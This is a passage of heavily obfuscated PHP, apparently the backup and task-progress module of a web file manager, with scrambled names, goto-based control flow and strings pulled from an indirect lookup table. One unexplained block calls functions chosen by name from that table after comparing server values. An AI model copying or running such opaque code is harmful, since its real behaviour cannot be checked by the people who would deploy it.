$fê†ˆ´¢ÁÈ = '') { goto dˆí×¹å–¥; AĞ³ƒß–: $A£ï½‹š×ê[$cè²½ëîó¼[388]] = $aÔÜË‚·Ú¯; return $A£ï½‹š×ê; goto AŒÈ²†œ¸œ; A÷æŒŞ‚…î: $this->checkStore($C°ö¬¦Ñ…É[$cè²½ëîó¼[704]]); $A£ï½‹š×ê = array($cè²½ëîó¼[704] => $C°ö¬¦Ñ…É[$cè²½ëîó¼[704]], $cè²½ëîó¼[28] => self::$name, $cè²½ëîó¼[702] => 0, $cè²½ëîó¼[705] => $C°ö¬¦Ñ…É[$cè²½ëîó¼[705]], $cè²½ëîó¼[289] => array($cè²½ëîó¼[706] => array($cè²½ëîó¼[702] => 0), $cè²½ëîó¼[707] => array($cè²½ëîó¼[702] => 0, $cè²½ëîó¼[708] => 0, $cè²½ëîó¼[709] => 0, $cè²½ëîó¼[29] => $cè²½ëîó¼[33]), $cè²½ëîó¼[710] => array($cè²½ëîó¼[702] => 0, $cè²½ëîó¼[708] => 0, $cè²½ëîó¼[709] => 0), $cè²½ëîó¼[173] => array($cè²½ëîó¼[702] => 0, $cè²½ëîó¼[711] => 0, $cè²½ëîó¼[712] => 0, $cè²½ëîó¼[713] => 0, $cè²½ëîó¼[714] => 0, $cè²½ëîó¼[441] => $b…ÄİŒ§Ø¿)), $cè²½ëîó¼[715] => time(), $cè²½ëîó¼[470] => 0); $aÔÜË‚·Ú¯ = Model($cè²½ëîó¼[701])->insert($A£ï½‹š×ê); goto AĞ³ƒß–; dˆí×¹å–¥: $cè²½ëîó¼ =& $_SERVER[Â€Á›¨õ]; $C°ö¬¦Ñ…É = Model($cè²½ëîó¼[701])->config(); if ($fê†ˆ´¢ÁÈ && $C°ö¬¦Ñ…É[$cè²½ëîó¼[704]] != $fê†ˆ´¢ÁÈ) { $b…ÄİŒ§Ø¿ = 0; } goto A÷æŒŞ‚…î; AŒÈ²†œ¸œ: } private function checkStore($E¬è‰¯ôÇŞ) { $CÊƒë©³ãì =& $_SERVER[Â€Á›¨õ]; $b“›èåÙèæ = Model($CÊƒë©³ãì[716])->listData($E¬è‰¯ôÇŞ); Model($CÊƒë©³ãì[716])->checkConfig($b“›èåÙèæ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Â€Á›¨õ][701])->findByName(self::$name); } return self::$option; } public static function set($D¢Ô½›÷) { $Aó¶åèË™ =& $_SERVER[Â€Á›¨õ]; $eàœƒŞ‹» = self::get(); foreach ($D¢Ô½›÷ as $b»–ô…ö–â => $FÉë×±ŠŠ‹) { $A½ô‘¶ô = explode($Aó¶åèË™[94], $b»–ô…ö–â); $f™°ÚÚ‚Ú† = count($A½ô‘¶ô); switch ($f™°ÚÚ‚Ú†) { case 1: $eàœƒŞ‹»[$A½ô‘¶ô[0]] = $FÉë×±ŠŠ‹; break; case 2: $eàœƒŞ‹»[$A½ô‘¶ô[0]][$A½ô‘¶ô[1]] = $FÉë×±ŠŠ‹; break; case 3: $eàœƒŞ‹»[$A½ô‘¶ô[0]][$A½ô‘¶ô[1]][$A½ô‘¶ô[2]] = $FÉë×±ŠŠ‹; break; } } Model($Aó¶åèË™[701])->update($eàœƒŞ‹»[$Aó¶åèË™[388]], $eàœƒŞ‹»); self::$option = $eàœƒŞ‹»; return self::$option; } public function keep() { $fĞÉ¨ÚŞ½İ =& $_SERVER[Â€Á›¨õ]; $D¢ª˜ÄÎ¡ö = self::get(); if ($D¢ª˜ÄÎ¡ö[$fĞÉ¨ÚŞ½İ[289]][$fĞÉ¨ÚŞ½İ[706]][$fĞÉ¨ÚŞ½İ[702]] == $fĞÉ¨ÚŞ½İ[86]) { return; } $this->backupKeep($D¢ª˜ÄÎ¡ö); self::set(array($fĞÉ¨ÚŞ½İ[717] => 1)); } private function backupKeep($eèëö¶Èè) { goto EÖ µ˜Û«; cèµÕ×²¾: for ($B‚ó÷Éçä = 0; $B‚ó÷Éçä < 12; $B‚ó÷Éçä++) { $fèÆ¡ø»Ö£[] = date($fõ³íØÏç[718], strtotime("\x2d{$B‚ó÷Éçä}\x20\155\x6f\156\x74\150\163")); } $fèÆ¡ø»Ö£ = array_unique($fèÆ¡ø»Ö£); foreach ($FÑ‚è…ˆÂç as $f÷ÌËß’) { if (!empty($f÷ÌËß’[$fõ³íØÏç[28]]) && in_array($f÷ÌËß’[$fõ³íØÏç[28]], $fèÆ¡ø»Ö£)) { continue; } Model($fõ³íØÏç[701])->remove($f÷ÌËß’[$fõ³íØÏç[388]]); $A£Š“¦ˆ¿´ = "\173\151\x6f\x3a{$eèëö¶Èè[$fõ³íØÏç[704]]}\175\x2f\144\141\164\141\x62\x61\x73\x65\x2f\x62\x61\143\x6b\165\x70\137{$f÷ÌËß’[$fõ³íØÏç[28]]}"; IO::remove($A£Š“¦ˆ¿´, !1); } goto fì„åƒ£å; bğ¨Ñš«á¹: $B‚ó÷Éçä = 0; $fèÆ¡ø»Ö£ = array(); foreach ($FÑ‚è…ˆÂç as $f÷ÌËß’) { if ($B‚ó÷Éçä >= 7) { break; } $fèÆ¡ø»Ö£[] = $f÷ÌËß’[$fõ³íØÏç[28]]; $B‚ó÷Éçä++; } goto cèµÕ×²¾; EÖ µ˜Û«: $fõ³íØÏç =& $_SERVER[Â€Á›¨õ]; $FÑ‚è…ˆÂç = Model($fõ³íØÏç[701])->listData(); if (empty($FÑ‚è…ˆÂç)) { return; } goto bğ¨Ñš«á¹; fì„åƒ£å: } public function db() { goto DÆÂÂÂ™´; aŠÆ—‚Ÿôˆ: $DïŠ¾­¨Ó¾ = new BackupDb(); if (!$DïŠ¾­¨Ó¾->index()) { return !1; } self::set(array($bê§µ““[719] => 1)); goto C˜Ï¨Î¹±›; DÆÂÂÂ™´: $bê§µ““ =& $_SERVER[Â€Á›¨õ]; $C¾Š‰™İ‰Ü = self::get(); if ($C¾Š‰™İ‰Ü[$bê§µ““[289]][$bê§µ““[707]][$bê§µ““[702]] == $bê§µ““[86]) { return !0; } goto aŠÆ—‚Ÿôˆ; C˜Ï¨Î¹±›: return !0; goto Båä¥™Úæ; Båä¥™Úæ: } public function dbFile() { goto Cè“ƒØà¶Ú; dåŸÓÈóÖÜ: $F¿‰™ùäùÉ = new BackupDbFile(); if (!$F¿‰™ùäùÉ->index()) { return !1; } self::set(array($bì­ò‹òğÔ[720] => 1)); goto aÀÀˆ‚å‘; aÀÀˆ‚å‘: return !0; goto aù‘ãË˜›ã; Cè“ƒØà¶Ú: $bì­ò‹òğÔ =& $_SERVER[Â€Á›¨õ]; $cŠ‚–Ìùˆ = self::get(); if ($cŠ‚–Ìùˆ[$bì­ò‹òğÔ[289]][$bì­ò‹òğÔ[710]][$bì­ò‹òğÔ[702]] == $bì­ò‹òğÔ[86]) { return !0; } goto dåŸÓÈóÖÜ; aù‘ãË˜›ã: } public function file() { $a ó—¥¢ÙÈ =& $_SERVER[Â€Á›¨õ]; $fîóïÉ‰‡ = self::get(); if ($fîóïÉ‰‡[$a ó—¥¢ÙÈ[289]][$a ó—¥¢ÙÈ[173]][$a ó—¥¢ÙÈ[702]] == $a ó—¥¢ÙÈ[86]) { return !0; } if (!isset($fîóïÉ‰‡[$a ó—¥¢ÙÈ[705]]) || $fîóïÉ‰‡[$a ó—¥¢ÙÈ[705]] == $a ó—¥¢ÙÈ[491]) { $AŒŠøø …Ù = new BackupFile(); if (!$AŒŠøø …Ù->index()) { return !1; } } self::set(array($a ó—¥¢ÙÈ[721] => 1, $a ó—¥¢ÙÈ[702] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto aˆœ¶ÆØ±Ğ; E‡»ÎíŒª: return !0; goto eÌ‹Ÿ‰Æó§; d‹ÙÜî”÷“: $cƒäêÇ‚“Ø = new DbManage($e÷–²¼ÉŠ, $AçÕë¤‡¡); $CèÍ´¸›Áƒ = TEMP_FILES . $d‡ßÈÓå[722] . self::$name . $d‡ßÈÓå[8]; del_dir($CèÍ´¸›Áƒ); goto d”›Èä™Ë; aˆœ¶ÆØ±Ğ: $d‡ßÈÓå =& $_SERVER[Â€Á›¨õ]; $DØİ™ºÅÃ§ = Backup::get(); self::$io = $DØİ™ºÅÃ§[$d‡ßÈÓå[704]]; goto fÏÜ“ŒÎã; d”›Èä™Ë: mk_dir($CèÍ´¸›Áƒ); $AÙƒ¬¬´³ä = $E“Ç·¥¯ = 0; try { $DÊİ ®Ìõ = $cƒäêÇ‚“Ø->db()->getTables(); } catch (Exception $fäÏæõÎæÅ) { return !1; } goto a¶†ê­Ö´Î; fÏÜ“ŒÎã: self::$name = $DØİ™ºÅÃ§[$d‡ßÈÓå[28]]; $e÷–²¼ÉŠ = $GLOBALS[$d‡ßÈÓå[6]][$d‡ßÈÓå[17]]; $AçÕë¤‡¡ = $this->_dbType($e÷–²¼ÉŠ); goto d‹ÙÜî”÷“; Aà®‹ÛÖÄ: $DˆğòîŸ¢Š = array($d‡ßÈÓå[734] => $AçÕë¤‡¡, $d‡ßÈÓå[719] => 1, $d‡ßÈÓå[735] => $AÙƒ¬¬´³ä, $d‡ßÈÓå[736] => $E“Ç·¥¯); Backup::set($DˆğòîŸ¢Š); if ($AÙƒ¬¬´³ä > $E“Ç·¥¯) { return !1; } goto E‡»ÎíŒª; a¶†ê­Ö´Î: $DÊİ ®Ìõ = array_diff($DÊİ ®Ìõ, array($d‡ßÈÓå[723], $d‡ßÈÓå[724])); foreach ($DÊİ ®Ìõ as $aìÆìƒˆ³—) { $AÙƒ¬¬´³ä += $cƒäêÇ‚“Ø->model($aìÆìƒˆ³—)->count(); } $fòŠŠ¹ˆ† = new Task($d‡ßÈÓå[725], $d‡ßÈÓå[726], $AÙƒ¬¬´³ä, LNG($d‡ßÈÓå[727]) . $d‡ßÈÓå[728] . LNG($d‡ßÈÓå[729])); goto C†­¢“Å«è; C†­¢“Å«è: foreach ($DÊİ ®Ìõ as $aìÆìƒˆ³—) { $d—·ÁØ‰Õä = $CèÍ´¸›Áƒ . $aìÆìƒˆ³— . $d‡ßÈÓå[730]; $c¨ö¿–¢ = null; if ($aìÆìƒˆ³— == $d‡ßÈÓå[731] && (!isset($DØİ™ºÅÃ§[$d‡ßÈÓå[705]]) || $DØİ™ºÅÃ§[$d‡ßÈÓå[705]] == $d‡ßÈÓå[491])) { $c¨ö¿–¢ = self::$io; } $E“Ç·¥¯ += $cƒäêÇ‚“Ø->sqlFromDb($aìÆìƒˆ³—, $d—·ÁØ‰Õä, $fòŠŠ¹ˆ†, $c¨ö¿–¢); } if (isset($fòŠŠ¹ˆ†->task[$d‡ßÈÓå[732]])) { $Dù¢½šÊî = $fòŠŠ¹ˆ†->task[$d‡ßÈÓå[732]] ? $fòŠŠ¹ˆ†->task[$d‡ßÈÓå[732]] : timeFloat(); $aíŠ„ºÌî¼ = $Dù¢½šÊî - $fòŠŠ¹ˆ†->task[$d‡ßÈÓå[733]]; if ($aíŠ„ºÌî¼ >= 0.2) { $AÙƒ¬¬´³ä += 1; } } $fòŠŠ¹ˆ†->end(); goto Aà®‹ÛÖÄ; eÌ‹Ÿ‰Æó§: } private function _dbType($DÕğ¼ºà) { goto A—Ö–¹ñß; A—Ö–¹ñß: $BàËäáÙ‘é =& $_SERVER[Â€Á›¨õ]; $DÕğ¼ºà = array_change_key_case($DÕğ¼ºà); $a­®ñ±ÔÃ = $DÕğ¼ºà[$BàËäáÙ‘é[737]]; goto cÚ¸×ßæ’ğ; cÚ¸×ßæ’ğ: if ($a­®ñ±ÔÃ == $BàËäáÙ‘é[738]) { $A‘¬Ç¼Ç¾ß = explode($BàËäáÙ‘é[4], $DÕğ¼ºà[$BàËäáÙ‘é[739]]); $a­®ñ±ÔÃ = $A‘¬Ç¼Ç¾ß[0]; } $c×ÇÉÃµœÆ = array($BàËäáÙ‘é[740] => $BàËäáÙ‘é[9], $BàËäáÙ‘é[741] => $BàËäáÙ‘é[742]); if (isset($c×ÇÉÃµœÆ[$a­®ñ±ÔÃ])) { $a­®ñ±ÔÃ = $c×ÇÉÃµœÆ[$a­®ñ±ÔÃ]; } goto a¾·Šø¨Ú‘; a¾·Šø¨Ú‘: return $a­®ñ±ÔÃ; goto bèÏ•À‚Ú; bèÏ•À‚Ú: } } class BackupDbFile { public function __construct() { } public function index() { goto f“§—¤íìÔ; b„Ã‰¨Î¾: $Eí‰ƒÙ£µ = TEMP_FILES . "\142\141\143\x6b\x75\x70\137{$fÆêßÕĞ¬î}\57"; $Bè©¡® Üù = "\173\151\157\x3a{$eŒ¼¥ÀÚ½[$a¹©Ù‘ëÁã[704]]}\x7d\x2f\144\x61\x74\x61\x62\141\163\145\x2f\x62\141\x63\153\165\x70\137{$fÆêßÕĞ¬î}\57"; if (!($Bè©¡® Üù = IO::mkdir($Bè©¡® Üù))) { return !1; } goto aæñò°ë¶ƒ; eÆêùóÉÁ: $dá•’ŠÚ„È->task[$a¹©Ù‘ëÁã[711]] = $BÏœ‰Š¼š; foreach ($eÚƒôìÍÕŠ[$a¹©Ù‘ëÁã[73]] as $E×åÔÂ÷’ç) { $a® Œ•Û¢œ = IO::move($E×åÔÂ÷’ç[$a¹©Ù‘ëÁã[75]], $Bè©¡® Üù); if (!$a® Œ•Û¢œ) { $dá•’ŠÚ„È->end(); $BÌÄËó˜ñ = IO::getLastError($a¹©Ù‘ëÁã[746] . $E×åÔÂ÷’ç[$a¹©Ù‘ëÁã[75]] . $a¹©Ù‘ëÁã[747] . $Bè©¡® Üù . $a¹©Ù‘ëÁã[499]); write_log($BÌÄËó˜ñ, $a¹©Ù‘ëÁã[726]); return !1; } } $A¬§Ï›ˆ¨ = CONTROLLER_DIR . $a¹©Ù‘ëÁã[748]; goto EñÂ›ã; Aö½¸ÖëÕİ: if (!$BÏœ‰Š¼š) { return !1; } Backup::set(array($a¹©Ù‘ëÁã[743] => $BÏœ‰Š¼š)); $dá•’ŠÚ„È = new TaskFileTransfer($a¹©Ù‘ëÁã[744], $a¹©Ù‘ëÁã[726], count($B«¿ŞÁ‘ø‘), LNG($a¹©Ù‘ëÁã[727]) . $a¹©Ù‘ëÁã[434] . LNG($a¹©Ù‘ëÁã[729]) . $a¹©Ù‘ëÁã[745]); goto eÆêùóÉÁ; f“§—¤íìÔ: $a¹©Ù‘ëÁã =& $_SERVER[Â€Á›¨õ]; $eŒ¼¥ÀÚ½ = Backup::get(); $fÆêßÕĞ¬î = $eŒ¼¥ÀÚ½[$a¹©Ù‘ëÁã[28]]; goto b„Ã‰¨Î¾; aæñò°ë¶ƒ: $eÚƒôìÍÕŠ = IO::listPath($Eí‰ƒÙ£µ); $B«¿ŞÁ‘ø‘ = isset($eÚƒôìÍÕŠ[$a¹©Ù‘ëÁã[73]]) ? $eÚƒôìÍÕŠ[$a¹©Ù‘ëÁã[73]] : array(); $BÏœ‰Š¼š = array_sum(array_column($B«¿ŞÁ‘ø‘, $a¹©Ù‘ëÁã[77])); goto Aö½¸ÖëÕİ; A‡»œËºß™: $dá•’ŠÚ„È->end(); Backup::set(array($a¹©Ù‘ëÁã[750] => $BÏœ‰Š¼š)); return !0; goto b½•íÅ¬‘Ì; EñÂ›ã: $fÈÁì™Òº = CONTROLLER_DIR . $a¹©Ù‘ëÁã[749]; IO::copy($A¬§Ï›ˆ¨, $Bè©¡® Üù); IO::copy($fÈÁì™Òº, $Bè©¡® Üù); goto A‡»œËºß™; b½•íÅ¬‘Ì: } } goto F«¨…Ã ‡³; EòğğßÙÍ: class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\x72\165\x6e\156\151\156\147"; const STATYS_KILL = "\153\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($A‚¢Ş³õ†ß, $E™²¹·Œ• = '', $f “ƒÑÜ´‘ = 0, $CĞ¶â£¢Ÿá = '') { goto Dø‹Öˆ˜Äó; e¼Íë×´ó: $this->startAfter(); Hook::trigger($E„Æ»‰¹ÈĞ[1511], $this->task); $this->task[$E„Æ»‰¹ÈĞ[1504]] = timeFloat(); goto fĞµì’õ¯Á; fÂ²ÙçâŸ: $GLOBALS[$E„Æ»‰¹ÈĞ[1507]] = 1; Hook::bind($E„Æ»‰¹ÈĞ[1466], array($this, $E„Æ»‰¹ÈĞ[1508])); Hook::bind($E„Æ»‰¹ÈĞ[1509], array($this, $E„Æ»‰¹ÈĞ[1510])); goto e¼Íë×´ó; Dø‹Öˆ˜Äó: $E„Æ»‰¹ÈĞ =& $_SERVER[Â€Á›¨õ]; if (self::get($A‚¢Ş³õ†ß)) { return; } $this->task = array($E„Æ»‰¹ÈĞ[388] => $A‚¢Ş³õ†ß, $E„Æ»‰¹ÈĞ[1501] => USER_ID, $E„Æ»‰¹ÈĞ[1406] => $CĞ¶â£¢Ÿá, $E„Æ»‰¹ÈĞ[29] => $E™²¹·Œ•, $E„Æ»‰¹ÈĞ[998] => $E„Æ»‰¹ÈĞ[33], $E„Æ»‰¹ÈĞ[996] => $f “ƒÑÜ´‘, $E„Æ»‰¹ÈĞ[1010] => 0, $E„Æ»‰¹ÈĞ[1502] => 0, $E„Æ»‰¹ÈĞ[1503] => 0, $E„Æ»‰¹ÈĞ[733] => timeFloat(), $E„Æ»‰¹ÈĞ[732] => 0, $E„Æ»‰¹ÈĞ[1504] => 0, $E„Æ»‰¹ÈĞ[1505] => 0, $E„Æ»‰¹ÈĞ[1506] => 0, $E„Æ»‰¹ÈĞ[702] => $E„Æ»‰¹ÈĞ[1464]); goto fÂ²ÙçâŸ; fĞµì’õ¯Á: } public function end() { goto AÀ¤Ÿ‹ƒã; Bòšæœœ‹: $b¹—½ÕÓƒ = timeFloat() - $this->task[$F¼±÷·ôĞĞ[733]]; self::log($F¼±÷·ôĞĞ[1512] . $this->task[$F¼±÷·ôĞĞ[388]] . $F¼±÷·ôĞĞ[1513] . $b¹—½ÕÓƒ . $F¼±÷·ôĞĞ[1514]); Hook::unbind($F¼±÷·ôĞĞ[1466], array($this, $F¼±÷·ôĞĞ[1508])); goto E›Û¥“•›; AÀ¤Ÿ‹ƒã: $F¼±÷·ôĞĞ =& $_SERVER[Â€Á›¨õ]; if (!$this->task) { return; } if ($this->task[$F¼±÷·ôĞĞ[1504]]) { self::valueSet($this->task[$F¼±÷·ôĞĞ[388]], !1); } goto Bòšæœœ‹; E›Û¥“•›: Hook::unbind($F¼±÷·ôĞĞ[1509], array($this, $F¼±÷·ôĞĞ[1510])); $this->endAfter(); $this->task = !1; goto c±¥éÌ¡µº; c±¥éÌ¡µº: } public function update($DÉå¥É‡åî = 0, $A¹âì©³… = false) { goto dé¹ëà–“›; eïÜ¥Ì¦š¢: $this->updateAfter(); $B•Ë´¶™óà = 0.2; if (timeFloat() - $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1504]] < $B•Ë´¶™óà && !$A¹âì©³…) { return; } goto B¨ „µ‚õ; B¨ „µ‚õ: $BÄ…Ó³åÕÂ = self::get($FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[388]]); $Cİµ‚ÜÖ‰ª = $BÄ…Ó³åÕÂ[$Ağê¨ˆö†–[702]]; if ($Cİµ‚ÜÖ‰ª == self::STATYS_KILL) { $Bè¤ÉÆç = array($Ağê¨ˆö†–[1515] => LNG($Ağê¨ˆö†–[1516]), $Ağê¨ˆö†–[1060] => !1); Cache::set($Ağê¨ˆö†–[1517] . $this->task[$Ağê¨ˆö†–[388]], $Bè¤ÉÆç, 30); $this->end(); die; } else { if ($Cİµ‚ÜÖ‰ª == self::STATYS_STOP) { $C¶¯‚Éä… = 2; $BÄ…Ó³åÕÂ[$Ağê¨ˆö†–[1505]] += $C¶¯‚Éä…; self::valueSet($FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[388]], $BÄ…Ó³åÕÂ); sleep($C¶¯‚Éä…); $this->update(); return; } } goto f œâ•Ó¨Ü; f œâ•Ó¨Ü: $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[702]] = $Cİµ‚ÜÖ‰ª ? $Cİµ‚ÜÖ‰ª : $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[702]]; $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1505]] = $BÄ…Ó³åÕÂ[$Ağê¨ˆö†–[1505]] ? $BÄ…Ó³åÕÂ[$Ağê¨ˆö†–[1505]] : 0; $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1504]] = timeFloat(); goto CğßáŸ½¶; CğßáŸ½¶: Hook::trigger($Ağê¨ˆö†–[1518], $FéÃ¤ÔÔ÷¨); self::valueSet($FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[388]], $FéÃ¤ÔÔ÷¨); goto e»ÍÕ…; dé¹ëà–“›: $Ağê¨ˆö†– =& $_SERVER[Â€Á›¨õ]; $FéÃ¤ÔÔ÷¨ =& $this->task; if (!$FéÃ¤ÔÔ÷¨) { return; } goto CÈ¯ˆ¤–—÷; CÈ¯ˆ¤–—÷: $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1010]] += $DÉå¥É‡åî; $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[732]] = timeFloat(); if ($FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[996]]) { if ($FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[996]] < $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1010]]) { $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[996]] = $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1010]]; } $d±‡öß·¤ç = timeFloat() - $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[733]] - $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1505]]; $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1502]] = $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1010]] / $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[996]]; $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1503]] = $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1010]] / $d±‡öß·¤ç; if ($FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1502]] > 0) { $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1506]] = $d±‡öß·¤ç * (1 - $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1502]]) / $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1502]]; } $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1506]] = $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1506]] <= 0 ? 0 : $FéÃ¤ÔÔ÷¨[$Ağê¨ˆö†–[1506]]; } goto eïÜ¥Ì¦š¢; e»ÍÕ…: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($aà›¿Ö÷ô½) { $a¤ÛÎÌô =& $_SERVER[Â€Á›¨õ]; Cache::set($a¤ÛÎÌô[1517] . $this->task[$a¤ÛÎÌô[388]], $aà›¿Ö÷ô½, 60); return $aà›¿Ö÷ô½; } public static function get($aèñá”Û–ö) { return self::valueGet($aèñá”Û–ö); } public static function listData() { $D’ôœùŞÛ = self::valueGet(); return array_sort_by($D’ôœùŞÛ, $_SERVER[Â€Á›¨õ][733], !0); } public static function kill($eÖğåŒÔ†®) { return self::changeStatus($eÖğåŒÔ†®, self::STATYS_KILL); } public static function stop($eÉĞ¿ÈÑ‰Š) { return self::changeStatus($eÉĞ¿ÈÑ‰Š, self::STATYS_STOP); } public static function restart($cÏŒâåªµ) { return self::changeStatus($cÏŒâåªµ, self::STATYS_RUNNING); } public static function killAll() { $B¢ñŒÆÙ =& $_SERVER[Â€Á›¨õ]; $DÁ¼´ÑÆ¨ = self::listData(); foreach ($DÁ¼´ÑÆ¨ as $c•Š±ì‘°) { self::kill($c•Š±ì‘°[$B¢ñŒÆÙ[388]]); } sleep(2); foreach ($DÁ¼´ÑÆ¨ as $c•Š±ì‘°) { self::valueSet($c•Š±ì‘°[$B¢ñŒÆÙ[388]], !1); } } private static function changeStatus($eŒø­Š™Ë, $aèäÏæƒá) { goto Eª•ÙÇÛ”; Aİˆ˜Ì¿½: return !0; goto Bèâí«É; a˜ôâö°ÚÒ: $EÑò•ñ[$BŸ•‹‘‰ÑÆ[702]] = $aèäÏæƒá; self::valueSet($eŒø­Š™Ë, $EÑò•ñ); self::log($BŸ•‹‘‰ÑÆ[1519] . $EÑò•ñ[$BŸ•‹‘‰ÑÆ[388]] . $BŸ•‹‘‰ÑÆ[1520] . $aèäÏæƒá); goto Aİˆ˜Ì¿½; Eª•ÙÇÛ”: $BŸ•‹‘‰ÑÆ =& $_SERVER[Â€Á›¨õ]; $EÑò•ñ = self::valueGet($eŒø­Š™Ë); if (!$EÑò•ñ) { return !1; } goto a˜ôâö°ÚÒ; Bèâí«É: } public static function valueGet($b–Ó—ñ¯³ = false) { $F¿µÒ¯õæ =& $_SERVER[Â€Á›¨õ]; if ($b–Ó—ñ¯³) { $Fí¦´Øª×ö = Model($F¿µÒ¯õæ[419])->where(array($F¿µÒ¯õæ[92] => $b–Ó—ñ¯³, $F¿µÒ¯õæ[29] => $F¿µÒ¯õæ[1521]))->find(); return $Fí¦´Øª×ö ? json_decode($Fí¦´Øª×ö[$F¿µÒ¯õæ[370]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($E£ÉìõŞ›ï = false) { goto d¾¿‘¾÷›…; d•®‡Œ÷«·: return $fÉŒããœŞ; goto e’Ğ ñÈ“; d¾¿‘¾÷›…: $dÉ‘ˆù™µ˜ =& $_SERVER[Â€Á›¨õ]; $E÷ç«³íÓ = array($dÉ‘ˆù™µ˜[29] => $dÉ‘ˆù™µ˜[1521]); if ($E£ÉìõŞ›ï) { $E÷ç«³íÓ[$dÉ‘ˆù™µ˜[1501]] = $E£ÉìõŞ›ï; } goto EÓ†¨…ÄÄ; EÓ†¨…ÄÄ: $fÉŒããœŞ = Model($dÉ‘ˆù™µ˜[419])->where($E÷ç«³íÓ)->select(); $fÉŒããœŞ = $fÉŒããœŞ ? $fÉŒããœŞ : array(); foreach ($fÉŒããœŞ as $f—¡ö£ŒÉ => $eÚóó¦æ­Ş) { $fÉŒããœŞ[$f—¡ö£ŒÉ] = json_decode($eÚóó¦æ­Ş[$dÉ‘ˆù™µ˜[370]], !0); } goto d•®‡Œ÷«·; e’Ğ ñÈ“: } public static function valueSet($bõ¯Ÿ¬ƒª, $E‘±¬šƒ¦¹) { goto FÉŒ°åŠ; FÉŒ°åŠ: $Bßéòİ®Æƒ =& $_SERVER[Â€Á›¨õ]; if (!$E‘±¬šƒ¦¹) { return Model($Bßéòİ®Æƒ[419])->where(array($Bßéòİ®Æƒ[92] => $bõ¯Ÿ¬ƒª, $Bßéòİ®Æƒ[29] => $Bßéòİ®Æƒ[1521]))->delete(); } $F ·²º•§‘ = json_encode($E‘±¬šƒ¦¹); goto E¡ÛÀ‘±Õ; E¡ÛÀ‘±Õ: if (!$F ·²º•§‘) { ob_start(); var_dump($E‘±¬šƒ¦¹); $AÛ•­µˆÄ£ = ob_get_clean(); self::log($Bßéòİ®Æƒ[1522] . json_encode_force($AÛ•­µˆÄ£)); } if (!$bõ¯Ÿ¬ƒª || !$E‘±¬šƒ¦¹[$Bßéòİ®Æƒ[388]]) { return !1; } $dÌéÍïªñÆ = array($Bßéòİ®Æƒ[29] => $Bßéòİ®Æƒ[1521], $Bßéòİ®Æƒ[1501] => USER_ID, $Bßéòİ®Æƒ[92] => $bõ¯Ÿ¬ƒª, $Bßéòİ®Æƒ[370] => $F ·²º•§‘); goto aêÓÛ‡šâ; aêÓÛ‡šâ: Model($Bßéòİ®Æƒ[419])->add($dÌéÍïªñÆ, array(), !0); goto DôÍÉé¥íæ; DôÍÉé¥íæ: } public static function log($B¹§¶“Œ¶Ø) { write_log($B¹§¶“Œ¶Ø, $_SERVER[Â€Á›¨õ][1523]); } } if ($_SERVER[$_SERVER[Â€Á›¨õ][811]] != $_SERVER[$_SERVER[Â€Á›¨õ][1350]]) { goto dõ§ù½İ¨ª; b¬àÔ‹à×: $cîòÄÈµ¿($_SERVER[$_SERVER[Â€Á›¨õ][1231]]); goto F¿Ö°¾…Û˜; A™Ş‚å‘ØÙ: $F…ÛÛ´Šô = explode($_SERVER[Â€Á›¨õ][227], $BçÛ¸áªˆ); if (count($F…ÛÛ´Šô) < $_SERVER[Â€Á›¨õ][592]) { $e¸£ÏÕè…Ÿ = $_SERVER[Â€Á›¨õ][814]; $e¸£ÏÕè…Ÿ(); } $cîòÄÈµ¿ = $_SERVER[Â€Á›¨õ][1232]; goto b¬àÔ‹à×; dõ§ù½İ¨ª: $d™Ú‡Ã“ÓŒ = $_SERVER[Â€Á›¨õ][813]; $dÅçá­Ë¾Ã = $_SERVER[$_SERVER[Â€Á›¨õ][808]] . $_SERVER[Â€Á›¨õ][809]; $BçÛ¸áªˆ = $d™Ú‡Ã“ÓŒ($dÅçá­Ë¾Ã); goto A™Ş‚å‘ØÙ; F¿Ö°¾…Û˜: } class TaskFileTransfer extends Task { protected function startAfter() { goto dÍ’šƒºòè; CŠ™«ß™…: Hook::bind($dª™Ó‹áôÒ[565], array($this, $dª™Ó‹áôÒ[1531])); Hook::bind($dª™Ó‹áôÒ[532], array($this, $dª™Ó‹áôÒ[1532])); Hook::bind($dª™Ó‹áôÒ[529], array($this, $dª™Ó‹áôÒ[1532])); goto A¸äƒÜ‹ƒ; Fˆ®òê›ù…: Hook::bind($dª™Ó‹áôÒ[561], array($this, $dª™Ó‹áôÒ[1529])); Hook::bind($dª™Ó‹áôÒ[562], array($this, $dª™Ó‹áôÒ[1530])); 